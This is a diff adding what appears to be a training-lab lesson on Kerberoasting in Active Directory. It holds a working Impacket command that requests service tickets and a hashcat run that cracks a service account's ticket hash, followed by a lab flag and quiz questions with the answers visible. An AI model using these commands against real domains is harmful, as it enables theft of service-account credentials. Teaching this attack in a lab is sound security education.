@@ -1,0 +1,58 @@
+# Active Directory (Kerberoasting)
+
+90% of Fortune 500 companies use Active Directory.
+Kerberoasting is an attack against Service Accounts.
+
+## The Theory
+
+1.  We request a TGS (Ticket Granting Service) ticket for a specific service (like SQL Server).
+2.  The Domain Controller (DC) encrypts the ticket with the **Service Account's NTLM Hash**.
+3.  We receive the ticket. We take it offline.
+4.  We try to brute force the hash. if the service account has a weak password, we win.
+
+## The Attack
+
+We use `Impacket` to request the tickets.
+
+```bash
+GetUserSPNs.py breachlabs.local/user:password -request
+```
+
+## Lab: Cracking the Hash
+
+We captured a hash for the `svc_sql` account.
+Crack it with Hashcat (Mode 13100).
+
+Input Hash: `$krb5tgs$23$*svc_sql$BREACHLABS.LOCAL...`
+
+<TerminalWindow 
+  cmd="hashcat -m 13100 hash.txt rockyou.txt" 
+  output="...
+$krb5tgs$23$*svc_sql...:database123
+
+Session..........: hashcat
+Status...........: Cracked
+Flag: BL{K3rb3r0ast_Ch4mp}" 
+/>
+
+The password was `database123`.
+
+<Quiz 
+  question="Which user accounts are targeted in Kerberoasting?"
+  options={[
+    "Domain Admins only",
+    "Service Accounts (SPNs)",
+    "Guest Accounts",
+    "Local Administrators"
+  ]}
+/>
+
+<Quiz 
+  question="What is the flag found after cracking the TGS ticket?"
+  options={[
+    "BL{K3rb3r0ast_Ch4mp}",
+    "BL{D0ma1n_Adm1n}",
+    "database123",
+    "svc_sql"
+  ]}
+/>
